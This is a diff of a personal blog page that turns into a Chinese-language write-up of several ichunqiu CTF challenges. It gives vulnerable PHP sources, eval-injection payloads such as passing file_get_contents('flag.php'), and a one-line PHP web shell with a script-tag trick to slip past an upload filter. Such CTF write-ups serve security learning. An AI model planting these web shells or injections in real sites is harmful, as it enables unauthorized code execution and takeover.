@@ -81,14 +81,20 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://pursu0.github.io/tags/index.html">
+<meta name="description" content="10pt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ichunqiu_CTF">
+<meta property="og:url" content="http://pursu0.github.io/2019/09/08/ichunqiu/index.html">
 <meta property="og:site_name" content="Pursu0 blogs">
+<meta property="og:description" content="10pt">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-26T10:27:36.295Z">
+<meta property="og:image" content="http://pursu0.github.io/2019/09/08/ichunqiu/1.png">
+<meta property="og:image" content="http://pursu0.github.io/2019/09/08/ichunqiu/2.png">
+<meta property="og:updated_time" content="2019-09-08T08:30:14.328Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="ichunqiu_CTF">
+<meta name="twitter:description" content="10pt">
+<meta name="twitter:image" content="http://pursu0.github.io/2019/09/08/ichunqiu/1.png">
 
 
 
@@ -118,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://pursu0.github.io/tags/">
+  <link rel="canonical" href="http://pursu0.github.io/2019/09/08/ichunqiu/">
 
 
 
 
 
-  <title>标签 | Pursu0 blogs</title>
+  <title>ichunqiu_CTF | Pursu0 blogs</title>
   
 
 
@@ -271,40 +277,189 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://pursu0.github.io/2019/09/08/ichunqiu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pursu0">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursu0 blogs">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">标签</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                暂无标签
-            </div>
-            <div class="tag-cloud-tags">
+          <h1 class="post-title" itemprop="name headline">ichunqiu_CTF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
               
-            </div>
-          </div>
-        
-      </div>
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-08T13:50:36+08:00">
+                2019-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="10pt"><a href="#10pt" class="headerlink" title="10pt"></a>10pt</h2><a id="more"></a>
+
+<h4 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h4><p>给出源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;&lt;!--学正则表达式后补充说明此处--&gt;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>$$a想到传输参数GLOBALS，列出全部。得到flag</p>
+<p><img src="//pursu0.github.io/2019/09/08/ichunqiu/1.png" alt="1"></p>
+<h4 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造?hello=file_get_contents(“flag.php”)，查看源代码获得flag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">83</span>) <span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">$flag = 'Too Young Too Simple';</span></span><br><span class="line"><span class="string">#flag&#123;2c2cde90-5e2b-486f-bb0f-4634698aed51&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><em>require</em> 和 <em>include</em> 几乎完全一样，除了处理失败的方式不同之外。<strong>require</strong>在出错时将导致脚本中止而 <em>inlude</em> 只产生警告（<strong>E_WARNING</strong>，脚本会继续运行。 </p>
+</blockquote>
+<p>真爆破</p>
+<h2 id="50pt"><a href="#50pt" class="headerlink" title="50pt"></a>50pt</h2><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先试试一句话，提示上传成功，在网页源代码中可看见路径u/hack.php。但无法用菜刀链接。</p>
+<p>访问上传的文件，输出了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&apos;pass&apos;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了关键字。修改一句话为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span>@eval($_POST['pass'])<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>链接成功</p>
+<p><img src="//pursu0.github.io/2019/09/08/ichunqiu/2.png" alt="2"></p>
+<h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4>
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/04/备份文件/" rel="next" title="备份文件相关">
+                <i class="fa fa-chevron-left"></i> 备份文件相关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +492,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -396,6 +560,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#10pt"><span class="nav-number">1.</span> <span class="nav-text">10pt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破-1"><span class="nav-number">1.0.1.</span> <span class="nav-text">爆破-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破-2"><span class="nav-number">1.0.2.</span> <span class="nav-text">爆破-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破-3"><span class="nav-number">1.0.3.</span> <span class="nav-text">爆破-3</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#50pt"><span class="nav-number">2.</span> <span class="nav-text">50pt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Upload"><span class="nav-number">2.0.1.</span> <span class="nav-text">Upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#code"><span class="nav-number">2.0.2.</span> <span class="nav-text">code</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
